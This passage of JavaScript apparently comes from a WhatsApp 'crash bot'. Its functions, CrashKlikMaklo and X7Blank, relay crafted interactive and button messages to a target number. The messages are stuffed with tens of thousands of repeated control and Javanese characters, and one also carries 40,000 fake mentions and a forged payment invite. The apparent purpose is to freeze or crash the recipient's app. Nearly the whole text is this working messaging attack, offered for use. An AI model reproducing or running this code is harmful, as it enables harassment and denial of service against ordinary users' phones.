         },
       }, { participant: { jid: target }});
     }
     
async function CrashKlikMaklo(target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo(RcB)"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }     

async function X7Blank(target) {
  const ButtonsX = [];

  for (let i = 0; i < 25; i++) {
    ButtonsX.push({
      buttonId: "cta_copy",
      buttonText: {
        displayText: "ꦽ".repeat(5000),
      },
      type: 4,
      nativeFlowInfo: {
        name: "single_select",
        paramsJson: JSON.stringify({
          title: "ꦽ".repeat(5000),
          sections: [
            {
              title: "𝖡𝗒; 𝖠𝗌𝖾𝗉𝖷𝟩",
              highlight_label: "label",
              rows: [],
            },
          ],
        }),
      },
    });
  }

  await sock.sendMessage(
    target,
    {
      text: "ꦽ".repeat(25000),
      footer: "𝖷𝟩 𝖭𝗂𝗁" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
      viewOnce: true,
      buttons: ButtonsX,
      headerType: 1,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 40000 },
            () =>
              "1" +
              Math.floor(Math.random() * 5000000) +
              "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000,
          },
        },
        businessMessageForwardInfo: {
          businessOwnerJid: target,
        },
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
      participant: { jid: target },
    }
  );
}

//


bot.launch()
